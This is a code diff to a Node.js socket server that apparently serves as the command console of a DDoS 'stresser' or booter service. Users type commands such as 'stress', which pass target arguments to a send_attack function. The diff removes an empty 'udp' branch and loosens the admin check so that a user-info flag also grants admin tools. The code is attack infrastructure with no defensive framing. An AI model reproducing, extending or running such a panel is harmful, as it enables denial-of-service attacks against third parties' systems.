@@ -88,7 +88,7 @@ Server.svr.on('connection', async function(socket) {
         let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
         let Current = Crud.GetCurrentUser(Server.Socket_Info.UserIP).split(",");
         eConfig.GetCmd(inputCMD);
-        // eConfig.GetUserInfo();
+        eConfig.GetUserInfo(Current[0]);
 
         if(eConfig.CurrentCmd.Cmd === "help" || eConfig.CurrentCmd.Cmd === "?") {
             socket.write(Config.Colors.Clear + Banners.main_b() + Banners.help_list() + Config.hostname(Current[0]));
@@ -107,10 +107,8 @@ Server.svr.on('connection', async function(socket) {
         } else if(eConfig.CurrentCmd.Cmd === "stress") {
             console.log(eConfig.CurrentCmd.arg);
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
-        } else if(eConfig.CurrentCmd.Cmd === "udp") {
-            
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
-            if(eCrud.isAdmin(Current[0])) {
+            if(eCrud.isAdmin(Current[0]) || eConfig.CurrentUser.isAdmin === true) {
                 let tool = eConfig.CurrentCmd.arg[1];
                 let arg2 = eConfig.CurrentCmd.arg[2];
                 let arg3 = eConfig.CurrentCmd.arg[3];
